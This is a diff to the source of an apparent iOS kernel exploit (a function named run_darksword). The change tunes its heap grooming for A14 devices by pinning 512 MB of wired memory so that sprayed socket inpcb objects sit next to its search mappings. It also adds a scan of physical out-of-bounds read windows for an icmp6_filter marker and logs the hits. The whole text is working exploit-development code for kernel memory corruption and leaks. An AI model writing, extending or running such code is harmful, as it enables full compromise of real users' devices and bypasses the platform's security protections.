@@ -124,10 +124,20 @@ static pthread_t writeThread;
 static int highestSuccessIdx = 0;
 static int successReadCount = 0;
 static uint64_t gNameHits = 0, gRejZero = 0, gRejGencnt = 0, gRejCsi = 0;
+static uint64_t gInpcbMarkers = 0;
 static struct iovec iov;
 static char executablePath[PATH_MAX];
 static const char *executableName;
 static NSMutableDictionary *gMlockDict;
+
+// Wired-mapping groom (A18-style, scaled for 4 GB RAM). The original A18 path
+// pins ~3 GB of PurpleGfxMem-backed IOSurface pages to drain the physical free
+// list so the tiny search mappings and the sprayed socket inpcbs land in the
+// same fresh sequential region. On A14 we scale the wired region down and keep
+// the search total smaller so the pair stays within the ~1 GB Jetsam budget.
+#define WIRED_MAPPING_SIZE 0x20000000      // 512 MB pinned
+static mach_vm_address_t wiredMapping = 0;
+static mach_vm_size_t wiredMappingSize = WIRED_MAPPING_SIZE;
 
 // Kernel state globals (used by all phases)
 uint64_t gOurProc, gKernelProc, gOurTask, gKernelTask, gIS_TABLE;
@@ -311,6 +321,23 @@ static void describe_window(const void *buf, mach_vm_size_t size, const char *ta
         printf("[dbg]   +0x%03x: 0x%016llx\n", i * 8, (unsigned long long)w[i]);
     }
     fflush(stdout);
+}
+
+// DIAGNOSTIC: count occurrences of the icmp6_filter marker
+// 0x0000ffffffffffff in a window. A hit strongly suggests the window
+// contains a kalloc.1024 inpcb rather than fs/vnode data.
+static uint64_t count_inpcb_markers(const void *buf, mach_vm_size_t size) {
+    const uint8_t *p = (const uint8_t *)buf;
+    const uint8_t marker[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00};
+    uint64_t hits = 0;
+    for (mach_vm_size_t i = 0; i + 8 <= size; i++) {
+        if (p[i] == 0xff && p[i + 1] == 0xff && p[i + 2] == 0xff && p[i + 3] == 0xff &&
+            p[i + 4] == 0xff && p[i + 5] == 0xff && p[i + 6] == 0xff && p[i + 7] == 0x00) {
+            hits++;
+            i += 8;
+        }
+    }
+    return hits;
 }
 
 fileport_t spray_socket(void) {
@@ -1469,10 +1496,33 @@ bool run_darksword(void) {
 
     pthread_create(&freeThread, NULL, free_thread, NULL);
 
-    uint64_t mappingPages = 0x1000 * 0x10;
+    // Scaled groom layout for A14 (4 GB): pin 512 MB of wired pages up front,
+    // then search with a reduced total (~256 MB) so the inpcb pages from the
+    // socket spray end up physically adjacent to the search-mapping windows.
+    uint64_t mappingPages = 0x4000;         // 256 MB total search
     uint64_t searchSize = 0x2000 * PAGE_SIZE;
     uint64_t totalSize = mappingPages * PAGE_SIZE;
     uint64_t mappingNum = totalSize / searchSize;
+
+    if (wiredMapping == 0) {
+        mach_vm_address_t wa = 0;
+        kern_return_t wkr = mach_vm_allocate(mach_task_self(), &wa,
+            wiredMappingSize, VM_FLAGS_ANYWHERE);
+        if (wkr == KERN_SUCCESS) {
+            wiredMapping = wa;
+            surface_mlock(wiredMapping, wiredMappingSize);
+            // Touch every page to force the physical allocation now, while the
+            // app still has headroom, instead of letting it page in lazily.
+            for (uint64_t s = 0; s < wiredMappingSize / PAGE_SIZE; s++)
+                *(uint64_t*)(wiredMapping + s * PAGE_SIZE) = 0;
+            printf("[+] wired groom: 0x%llx +0x%llx (%llu MB pinned)\n",
+                (uint64_t)wiredMapping, (uint64_t)wiredMappingSize,
+                (unsigned long long)(wiredMappingSize / (1024 * 1024)));
+        } else {
+            printf("[-] wired groom alloc failed (kr=%d), continuing without it\n", wkr);
+        }
+        fflush(stdout);
+    }
 
     void *rBuf = calloc(1, OOB_SIZE);
     void *wBuf = calloc(1, OOB_SIZE);
@@ -1533,6 +1583,12 @@ bool run_darksword(void) {
             uint64_t mStart = mach_absolute_time();
             for (mach_vm_offset_t so = 0; so <= searchSize - pcSize; so += PAGE_SIZE) {
                 if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
+                    uint64_t m = count_inpcb_markers(rBuf, OOB_SIZE);
+                    if (m) {
+                        gInpcbMarkers++;
+                        printf("[+] inpcb-marker window! map=%llu off=0x%llx markers=%llu (cum=%llu)\n",
+                            s, (unsigned long long)so, m, (unsigned long long)gInpcbMarkers);
+                    }
                     if ((successReadCount <= 8) && (gDumpCount < 64)) {
                         describe_window(rBuf, OOB_SIZE, "first-ok");
                         dump_window(rBuf, OOB_SIZE, "win");
@@ -1552,8 +1608,8 @@ bool run_darksword(void) {
                 }
             }
             double mEl = (double)(mach_absolute_time() - mStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
-            printf("[exploit]   map %llu done: readOK=%d try=%d nameHits=%llu rej0=%llu rejGc=%llu rejCsi=%llu %.1fs\n",
-                s, successReadCount, highestSuccessIdx, gNameHits, gRejZero, gRejGencnt, gRejCsi, mEl);
+            printf("[exploit]   map %llu done: readOK=%d try=%d nameHits=%llu rej0=%llu rejGc=%llu rejCsi=%llu inpcbMrk=%llu %.1fs\n",
+                s, successReadCount, highestSuccessIdx, gNameHits, gRejZero, gRejGencnt, gRejCsi, gInpcbMarkers, mEl);
             fflush(stdout);
             mach_port_deallocate(mach_task_self(), memObj);
             if (ok) break;
@@ -1589,6 +1645,7 @@ bool run_darksword(void) {
 
     printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);
     printf("[+] successReadCount: %d\n", successReadCount);
+    printf("[+] inpcbMarkerWindows: %llu\n", (unsigned long long)gInpcbMarkers);
     fflush(stdout);
 
     goSync = 0; raceSync = 1;
